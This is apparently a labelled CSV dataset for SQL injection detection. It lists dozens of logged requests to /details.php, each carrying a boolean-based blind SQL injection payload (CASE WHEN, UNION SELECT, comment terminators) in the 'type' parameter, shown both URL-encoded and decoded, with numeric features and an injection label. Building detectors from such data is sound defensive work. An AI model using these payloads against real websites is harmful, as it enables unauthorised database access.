full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x4c7a5642%20FROM%20DUAL%20WHERE%207994%3D7994%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?'||(SELECT 0x4c7a5642 FROM DUAL WHERE 7994=7994 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.988111,7,146,97.8,5,8.219178082191782,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x45787664%20WHERE%208527%3D8527%20AND%205657%3D%28SELECT%20%28CASE%20WHEN%20%285657%3D2034%29%20THEN%205657%20ELSE%20%28SELECT%202034%20UNION%20SELECT%201748%29%20END%29%29--%20-,/details.php?prod=5&type=?'+(SELECT 0x45787664 WHERE 8527=8527 AND 5657=(SELECT (CASE WHEN (5657=2034) THEN 5657 ELSE (SELECT 2034 UNION SELECT 1748) END))-- -,192.168.43.6,1681395122.992456,6,135,97.8,5,8.148148148148149,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x45787570%20WHERE%201811%3D1811%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?'+(SELECT 0x45787570 WHERE 1811=1811 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395122.996256,6,135,97.8,5,8.148148148148149,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x78467379%20FROM%20DUAL%20WHERE%203766%3D3766%20AND%206533%3D%28SELECT%20%28CASE%20WHEN%20%286533%3D7043%29%20THEN%206533%20ELSE%20%28SELECT%207043%20UNION%20SELECT%205651%29%20END%29%29--%20-,/details.php?prod=5&type=?||(SELECT 0x78467379 FROM DUAL WHERE 3766=3766 AND 6533=(SELECT (CASE WHEN (6533=7043) THEN 6533 ELSE (SELECT 7043 UNION SELECT 5651) END))-- -,192.168.43.6,1681395122.999942,7,145,97.8,4,7.586206896551724,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x71655262%20FROM%20DUAL%20WHERE%209243%3D9243%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?||(SELECT 0x71655262 FROM DUAL WHERE 9243=9243 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.004059,7,145,97.8,4,7.586206896551724,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x52537a51%20WHERE%203912%3D3912%20AND%205031%3D%28SELECT%20%28CASE%20WHEN%20%285031%3D8690%29%20THEN%205031%20ELSE%20%28SELECT%208690%20UNION%20SELECT%201956%29%20END%29%29--%20-,/details.php?prod=5&type=?||(SELECT 0x52537a51 WHERE 3912=3912 AND 5031=(SELECT (CASE WHEN (5031=8690) THEN 5031 ELSE (SELECT 8690 UNION SELECT 1956) END))-- -,192.168.43.6,1681395123.009168,6,135,97.8,4,7.407407407407407,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x44426b42%20WHERE%204153%3D4153%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?||(SELECT 0x44426b42 WHERE 4153=4153 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.012664,6,135,97.8,4,7.407407407407407,1
/details.php?prod=5&type=%3F%2B%28SELECT%20mGjj%20WHERE%204728%3D4728%20AND%204123%3D%28SELECT%20%28CASE%20WHEN%20%284123%3D5444%29%20THEN%204123%20ELSE%20%28SELECT%205444%20UNION%20SELECT%207743%29%20END%29%29--%20-,/details.php?prod=5&type=?+(SELECT mGjj WHERE 4728=4728 AND 4123=(SELECT (CASE WHEN (4123=5444) THEN 4123 ELSE (SELECT 5444 UNION SELECT 7743) END))-- -,192.168.43.6,1681395123.016917,6,128,97.8,4,7.8125,1
/details.php?prod=5&type=%3F%2B%28SELECT%20yujj%20WHERE%205614%3D5614%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?+(SELECT yujj WHERE 5614=5614 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.021458,6,128,97.8,4,7.8125,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x696f7641%20WHERE%202217%3D2217%20AND%203950%3D%28SELECT%20%28CASE%20WHEN%20%283950%3D3957%29%20THEN%203950%20ELSE%20%28SELECT%203957%20UNION%20SELECT%202018%29%20END%29%29--%20-,/details.php?prod=5&type=?+(SELECT 0x696f7641 WHERE 2217=2217 AND 3950=(SELECT (CASE WHEN (3950=3957) THEN 3950 ELSE (SELECT 3957 UNION SELECT 2018) END))-- -,192.168.43.6,1681395123.025331,6,134,97.8,4,7.462686567164179,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x73795546%20WHERE%208229%3D8229%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?+(SELECT 0x73795546 WHERE 8229=8229 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.079648,6,134,97.8,4,7.462686567164179,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20xgrH%20WHERE%208587%3D8587%20AND%201555%3D%28SELECT%20%28CASE%20WHEN%20%281555%3D7991%29%20THEN%201555%20ELSE%20%28SELECT%207991%20UNION%20SELECT%208428%29%20END%29%29--%20-,/details.php?prod=5&type=?')) AS xgrH WHERE 8587=8587 AND 1555=(SELECT (CASE WHEN (1555=7991) THEN 1555 ELSE (SELECT 7991 UNION SELECT 8428) END))-- -,192.168.43.6,1681395123.084352,6,126,97.8,5,8.73015873015873,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20hnYg%20WHERE%206847%3D6847%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?')) AS hnYg WHERE 6847=6847 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.088482,6,126,97.8,5,8.73015873015873,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20OYZu%20WHERE%203357%3D3357%20AND%204713%3D%28SELECT%20%28CASE%20WHEN%20%284713%3D1103%29%20THEN%204713%20ELSE%20%28SELECT%201103%20UNION%20SELECT%202695%29%20END%29%29--%20-,"/details.php?prod=5&type=?"")) AS OYZu WHERE 3357=3357 AND 4713=(SELECT (CASE WHEN (4713=1103) THEN 4713 ELSE (SELECT 1103 UNION SELECT 2695) END))-- -",192.168.43.6,1681395123.094086,6,126,97.8,5,8.73015873015873,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20FykE%20WHERE%204250%3D4250%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"")) AS FykE WHERE 4250=4250 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395123.09834,6,126,97.8,5,8.73015873015873,1
/details.php?prod=5&type=%3F%29%29%20AS%20iRjd%20WHERE%206801%3D6801%20AND%203125%3D%28SELECT%20%28CASE%20WHEN%20%283125%3D5548%29%20THEN%203125%20ELSE%20%28SELECT%205548%20UNION%20SELECT%203616%29%20END%29%29--%20-,/details.php?prod=5&type=?)) AS iRjd WHERE 6801=6801 AND 3125=(SELECT (CASE WHEN (3125=5548) THEN 3125 ELSE (SELECT 5548 UNION SELECT 3616) END))-- -,192.168.43.6,1681395123.104086,6,125,97.8,4,8.0,1
/details.php?prod=5&type=%3F%29%29%20AS%20ikFV%20WHERE%204628%3D4628%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?)) AS ikFV WHERE 4628=4628 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.108117,6,125,97.8,4,8.0,1
/details.php?prod=5&type=%3F%27%29%20AS%20neNM%20WHERE%202816%3D2816%20AND%208519%3D%28SELECT%20%28CASE%20WHEN%20%288519%3D4544%29%20THEN%208519%20ELSE%20%28SELECT%204544%20UNION%20SELECT%207312%29%20END%29%29--%20-,/details.php?prod=5&type=?') AS neNM WHERE 2816=2816 AND 8519=(SELECT (CASE WHEN (8519=4544) THEN 8519 ELSE (SELECT 4544 UNION SELECT 7312) END))-- -,192.168.43.6,1681395123.112515,6,125,97.8,5,8.8,1
/details.php?prod=5&type=%3F%27%29%20AS%20ddKz%20WHERE%204137%3D4137%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?') AS ddKz WHERE 4137=4137 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.116238,6,125,97.8,5,8.8,1
/details.php?prod=5&type=%3F%22%29%20AS%20uiHh%20WHERE%201765%3D1765%20AND%205627%3D%28SELECT%20%28CASE%20WHEN%20%285627%3D5632%29%20THEN%205627%20ELSE%20%28SELECT%205632%20UNION%20SELECT%204670%29%20END%29%29--%20-,"/details.php?prod=5&type=?"") AS uiHh WHERE 1765=1765 AND 5627=(SELECT (CASE WHEN (5627=5632) THEN 5627 ELSE (SELECT 5632 UNION SELECT 4670) END))-- -",192.168.43.6,1681395123.120124,6,125,97.8,5,8.8,1
/details.php?prod=5&type=%3F%22%29%20AS%20Qhrd%20WHERE%209862%3D9862%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?"") AS Qhrd WHERE 9862=9862 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395123.124525,6,125,97.8,5,8.8,1
/details.php?prod=5&type=%3F%29%20AS%20QuZc%20WHERE%205255%3D5255%20AND%201768%3D%28SELECT%20%28CASE%20WHEN%20%281768%3D3444%29%20THEN%201768%20ELSE%20%28SELECT%203444%20UNION%20SELECT%207880%29%20END%29%29--%20-,/details.php?prod=5&type=?) AS QuZc WHERE 5255=5255 AND 1768=(SELECT (CASE WHEN (1768=3444) THEN 1768 ELSE (SELECT 3444 UNION SELECT 7880) END))-- -,192.168.43.6,1681395123.129966,6,124,97.8,4,8.064516129032258,1
/details.php?prod=5&type=%3F%29%20AS%20aLUg%20WHERE%207209%3D7209%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?) AS aLUg WHERE 7209=7209 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.135946,6,124,97.8,4,8.064516129032258,1
/details.php?prod=5&type=%3F%60%20WHERE%203234%3D3234%20AND%209156%3D%28SELECT%20%28CASE%20WHEN%20%289156%3D4673%29%20THEN%209156%20ELSE%20%28SELECT%204673%20UNION%20SELECT%202900%29%20END%29%29--%20-,/details.php?prod=5&type=?` WHERE 3234=3234 AND 9156=(SELECT (CASE WHEN (9156=4673) THEN 9156 ELSE (SELECT 4673 UNION SELECT 2900) END))-- -,192.168.43.6,1681395123.140844,6,116,97.8,4,8.620689655172415,1
/details.php?prod=5&type=%3F%60%20WHERE%206554%3D6554%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?` WHERE 6554=6554 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.144156,6,116,97.8,4,8.620689655172415,1
/details.php?prod=5&type=%3F%60%29%20WHERE%204761%3D4761%20AND%208140%3D%28SELECT%20%28CASE%20WHEN%20%288140%3D9356%29%20THEN%208140%20ELSE%20%28SELECT%209356%20UNION%20SELECT%203416%29%20END%29%29--%20-,/details.php?prod=5&type=?`) WHERE 4761=4761 AND 8140=(SELECT (CASE WHEN (8140=9356) THEN 8140 ELSE (SELECT 9356 UNION SELECT 3416) END))-- -,192.168.43.6,1681395123.148376,6,117,97.8,4,8.547008547008547,1
/details.php?prod=5&type=%3F%60%29%20WHERE%202351%3D2351%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?`) WHERE 2351=2351 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.152961,6,117,97.8,4,8.547008547008547,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%204969%3D%28SELECT%20%28CASE%20WHEN%20%284969%3D1670%29%20THEN%204969%20ELSE%20%28SELECT%201670%20UNION%20SELECT%204940%29%20END%29%29--%20-,/details.php?prod=5&type=?`=`?` AND 4969=(SELECT (CASE WHEN (4969=1670) THEN 4969 ELSE (SELECT 1670 UNION SELECT 4940) END))-- -,192.168.43.6,1681395123.156671,5,104,97.8,4,8.653846153846153,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?`=`?` AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.160272,5,104,97.8,4,8.653846153846153,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%205567%3D%28SELECT%20%28CASE%20WHEN%20%285567%3D5340%29%20THEN%205567%20ELSE%20%28SELECT%205340%20UNION%20SELECT%201478%29%20END%29%29--%20-,"/details.php?prod=5&type=?""=""?"" AND 5567=(SELECT (CASE WHEN (5567=5340) THEN 5567 ELSE (SELECT 5340 UNION SELECT 1478) END))-- -",192.168.43.6,1681395123.164736,5,104,97.8,5,9.615384615384615,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,"/details.php?prod=5&type=?""=""?"" AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -",192.168.43.6,1681395123.167793,5,104,97.8,5,9.615384615384615,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%208272%3D8272%20AND%206992%3D%28SELECT%20%28CASE%20WHEN%20%286992%3D1655%29%20THEN%206992%20ELSE%20%28SELECT%201655%20UNION%20SELECT%203146%29%20END%29%29--%20-,/details.php?prod=5&type=?]-(SELECT 0 WHERE 8272=8272 AND 6992=(SELECT (CASE WHEN (6992=1655) THEN 6992 ELSE (SELECT 1655 UNION SELECT 3146) END))-- -,192.168.43.6,1681395123.171966,6,126,97.8,4,7.936507936507937,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%203011%3D3011%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?]-(SELECT 0 WHERE 3011=3011 AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.175863,6,126,97.8,4,7.936507936507937,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%202586%3D%28SELECT%20%28CASE%20WHEN%20%282586%3D3351%29%20THEN%202586%20ELSE%20%28SELECT%203351%20UNION%20SELECT%207855%29%20END%29%29--%20-,/details.php?prod=5&type=?' IN BOOLEAN MODE) AND 2586=(SELECT (CASE WHEN (2586=3351) THEN 2586 ELSE (SELECT 3351 UNION SELECT 7855) END))-- -,192.168.43.6,1681395123.179611,6,117,97.8,5,9.401709401709402,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%209997%3D%28SELECT%20%28CASE%20WHEN%20%289997%3D9997%29%20THEN%209997%20ELSE%20%28SELECT%208412%20UNION%20SELECT%204659%29%20END%29%29--%20-,/details.php?prod=5&type=?' IN BOOLEAN MODE) AND 9997=(SELECT (CASE WHEN (9997=9997) THEN 9997 ELSE (SELECT 8412 UNION SELECT 4659) END))-- -,192.168.43.6,1681395123.183373,6,117,97.8,5,9.401709401709402,1
/details.php?prod=5&type=-5098%29%20OR%207281%3D%28SELECT%20%28CASE%20WHEN%20%287281%3D1524%29%20THEN%207281%20ELSE%20%28SELECT%201524%20UNION%20SELECT%203930%29%20END%29%29--%20-,/details.php?prod=5&type=-5098) OR 7281=(SELECT (CASE WHEN (7281=1524) THEN 7281 ELSE (SELECT 1524 UNION SELECT 3930) END))-- -,192.168.43.6,1681395123.188039,5,103,97.8,4,8.737864077669903,1
/details.php?prod=5&type=-4493%29%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-4493) OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.191331,5,103,97.8,4,8.737864077669903,1
/details.php?prod=5&type=-7383%27%29%20OR%202233%3D%28SELECT%20%28CASE%20WHEN%20%282233%3D4299%29%20THEN%202233%20ELSE%20%28SELECT%204299%20UNION%20SELECT%203715%29%20END%29%29--%20-,/details.php?prod=5&type=-7383') OR 2233=(SELECT (CASE WHEN (2233=4299) THEN 2233 ELSE (SELECT 4299 UNION SELECT 3715) END))-- -,192.168.43.6,1681395123.195588,5,104,97.8,5,9.615384615384615,1
/details.php?prod=5&type=-4324%27%29%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-4324') OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.200424,5,104,97.8,5,9.615384615384615,1
/details.php?prod=5&type=-8817%27%20OR%203122%3D%28SELECT%20%28CASE%20WHEN%20%283122%3D3682%29%20THEN%203122%20ELSE%20%28SELECT%203682%20UNION%20SELECT%205384%29%20END%29%29--%20-,/details.php?prod=5&type=-8817' OR 3122=(SELECT (CASE WHEN (3122=3682) THEN 3122 ELSE (SELECT 3682 UNION SELECT 5384) END))-- -,192.168.43.6,1681395123.205447,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=-8262%27%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-8262' OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.212485,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=-9320%22%20OR%207823%3D%28SELECT%20%28CASE%20WHEN%20%287823%3D6471%29%20THEN%207823%20ELSE%20%28SELECT%206471%20UNION%20SELECT%203058%29%20END%29%29--%20-,"/details.php?prod=5&type=-9320"" OR 7823=(SELECT (CASE WHEN (7823=6471) THEN 7823 ELSE (SELECT 6471 UNION SELECT 3058) END))-- -",192.168.43.6,1681395123.224519,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=-7804%22%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,"/details.php?prod=5&type=-7804"" OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -",192.168.43.6,1681395123.22934,5,103,97.8,5,9.70873786407767,1
/details.php?prod=5&type=-4626%29%29%20OR%202451%3D%28SELECT%20%28CASE%20WHEN%20%282451%3D5310%29%20THEN%202451%20ELSE%20%28SELECT%205310%20UNION%20SELECT%204217%29%20END%29%29--%20-,/details.php?prod=5&type=-4626)) OR 2451=(SELECT (CASE WHEN (2451=5310) THEN 2451 ELSE (SELECT 5310 UNION SELECT 4217) END))-- -,192.168.43.6,1681395123.296352,5,104,97.8,4,8.653846153846153,1
/details.php?prod=5&type=-5356%29%29%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-5356)) OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.303954,5,104,97.8,4,8.653846153846153,1
/details.php?prod=5&type=-7681%29%29%29%20OR%208304%3D%28SELECT%20%28CASE%20WHEN%20%288304%3D4031%29%20THEN%208304%20ELSE%20%28SELECT%204031%20UNION%20SELECT%205699%29%20END%29%29--%20-,/details.php?prod=5&type=-7681))) OR 8304=(SELECT (CASE WHEN (8304=4031) THEN 8304 ELSE (SELECT 4031 UNION SELECT 5699) END))-- -,192.168.43.6,1681395123.357004,5,105,97.8,4,8.571428571428571,1
/details.php?prod=5&type=-9816%29%29%29%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-9816))) OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.361226,5,105,97.8,4,8.571428571428571,1
/details.php?prod=5&type=-7388%20OR%204552%3D%28SELECT%20%28CASE%20WHEN%20%284552%3D1889%29%20THEN%204552%20ELSE%20%28SELECT%201889%20UNION%20SELECT%202386%29%20END%29%29--%20-,/details.php?prod=5&type=-7388 OR 4552=(SELECT (CASE WHEN (4552=1889) THEN 4552 ELSE (SELECT 1889 UNION SELECT 2386) END))-- -,192.168.43.6,1681395123.36564,5,102,97.8,4,8.823529411764707,1
/details.php?prod=5&type=-8144%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-8144 OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.369227,5,102,97.8,4,8.823529411764707,1
/details.php?prod=5&type=-1693%27%29%29%20OR%208945%3D%28SELECT%20%28CASE%20WHEN%20%288945%3D8878%29%20THEN%208945%20ELSE%20%28SELECT%208878%20UNION%20SELECT%204354%29%20END%29%29--%20-,/details.php?prod=5&type=-1693')) OR 8945=(SELECT (CASE WHEN (8945=8878) THEN 8945 ELSE (SELECT 8878 UNION SELECT 4354) END))-- -,192.168.43.6,1681395123.42067,5,105,97.8,5,9.523809523809524,1
/details.php?prod=5&type=-5697%27%29%29%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-5697')) OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.424037,5,105,97.8,5,9.523809523809524,1
/details.php?prod=5&type=-1160%27%29%29%29%20OR%201100%3D%28SELECT%20%28CASE%20WHEN%20%281100%3D7610%29%20THEN%201100%20ELSE%20%28SELECT%207610%20UNION%20SELECT%202972%29%20END%29%29--%20-,/details.php?prod=5&type=-1160'))) OR 1100=(SELECT (CASE WHEN (1100=7610) THEN 1100 ELSE (SELECT 7610 UNION SELECT 2972) END))-- -,192.168.43.6,1681395123.428339,5,106,97.8,5,9.433962264150944,1
/details.php?prod=5&type=-4847%27%29%29%29%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-4847'))) OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.432381,5,106,97.8,5,9.433962264150944,1
/details.php?prod=5&type=-9690%25%27%20OR%205226%3D%28SELECT%20%28CASE%20WHEN%20%285226%3D9107%29%20THEN%205226%20ELSE%20%28SELECT%209107%20UNION%20SELECT%203555%29%20END%29%29--%20-,/details.php?prod=5&type=-9690%' OR 5226=(SELECT (CASE WHEN (5226=9107) THEN 5226 ELSE (SELECT 9107 UNION SELECT 3555) END))-- -,192.168.43.6,1681395123.438197,5,104,97.8,5,9.615384615384615,1
/details.php?prod=5&type=-6040%25%27%20OR%204686%3D%28SELECT%20%28CASE%20WHEN%20%284686%3D4686%29%20THEN%204686%20ELSE%20%28SELECT%202624%20UNION%20SELECT%205267%29%20END%29%29--%20-,/details.php?prod=5&type=-6040%' OR 4686=(SELECT (CASE WHEN (4686=4686) THEN 4686 ELSE (SELECT 2624 UNION SELECT 5267) END))-- -,192.168.43.6,1681395123.442247,5,104,97.8,5,9.615384615384615,1
